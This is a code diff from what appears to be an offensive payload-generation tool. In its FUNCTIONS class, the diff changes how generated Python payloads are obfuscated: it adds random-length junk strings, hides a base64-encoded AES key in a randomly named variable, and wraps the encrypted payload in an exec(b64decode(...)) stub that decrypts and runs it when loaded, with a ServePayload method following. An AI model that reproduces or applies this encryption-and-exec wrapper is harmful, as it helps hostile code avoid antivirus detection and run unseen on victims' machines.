@@ -340,15 +340,16 @@ class FUNCTIONS(object):
         self.imports.append("from Crypto.Cipher import AES")
 
         random.shuffle(self.imports)
-        randomstring = ''.join(random.choice(string.lowercase) for x in range(500))
+        randomstring = ''.join(random.choice(string.lowercase) for x in range(random.randrange(300,1000)))
         randomimport = ''.join(random.choice(string.lowercase) for x in range(10))
         randombytes = ''
         for i in randomstring:
             randombytes += hex(ord(i))
-        newoutput = "%s = \"%s\"\n" % (randomimport,randombytes) + ";".join(self.imports) + "\n"
-
+        newoutput = randomimport[:-3] + " = \"%s\" "%(base64.b64encode(key)) + "\n"
+        newoutput += "%s = \"%s\"\n" % (randomimport,randombytes) + ";".join(self.imports) + "\n"
+        print newoutput
         newoutput += "exec(b64decode(\"%s\"))" % (base64.b64encode(
-            "exec(AES.new(\"%s\", AES.MODE_CBC, \"%s\").decrypt(b64decode(\"%s\")).rstrip('{'))\n" % (key, iv, encrypted)))
+            "exec(AES.new(b64decode(%s), AES.MODE_CBC, \"%s\").decrypt(b64decode(\"%s\")).rstrip('{'))\n" % (randomimport[:-3] , iv, encrypted)))
         return newoutput
 
     def ServePayload(self, payloaddirectory):
